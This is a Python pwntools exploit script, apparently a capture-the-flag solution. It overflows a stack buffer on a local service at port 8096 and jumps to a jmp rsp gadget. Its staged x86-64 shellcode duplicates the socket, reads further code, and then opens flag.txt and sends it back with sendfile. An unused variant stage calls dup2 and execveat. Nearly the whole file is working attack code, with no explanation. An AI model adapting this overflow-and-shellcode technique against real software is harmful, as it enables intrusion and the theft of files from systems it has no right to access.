from pwn import *
import time

p = remote('localhost',8096)


jmprsp = 0x000000000040186d

shellcode = '''
mov rdi, rax 
mov dil, 2
mov al, 32
syscall
dec eax
mov rdi, rax
mov r10, rdi
xor rax, rax
mov rdx, rax
mov rsi, rsp
sub rsi, 36
mov dl, 100
syscall
'''
shellcode = asm(shellcode, arch='amd64')
print len(shellcode)
shellcode1 = '\xeb\xd2'


shell = """
    mov r9, rsi
    xor rdx, rdx
top:
    xor rax, rax
    mov rdi, r10
    mov rsi, rdx
    mov al, 33
    syscall
    inc rdx
    cmp rdx, 3
    jne top

    xor rax, rax
    mov rdi, rax
    mov rdx, rax
    mov rsi, r9
    mov r8, rax
    mov r10, rax
    mov ax, 322
    syscall

"""

shell = """
    xor rax, rax
    mov rdi, rsi
    mov rsi, rax
    mov sil, 4
    mov rdx, rax
    mov al, 2
    syscall

    mov rsi, rax
    mov rdi, r10
    xor rax, rax
    mov rdx ,rax
    mov r10w, 100
    mov al, 40
    syscall
"""
shell = asm(shell, arch='amd64')


print shellcode.encode('hex')
p.sendline('done'+'\x90'*(36-len(shellcode))+shellcode+ p64(jmprsp) + shellcode1)
time.sleep(.1)

p.sendline('flag.txt\x00'+'\x90'*30 + shell)




p.interactive()
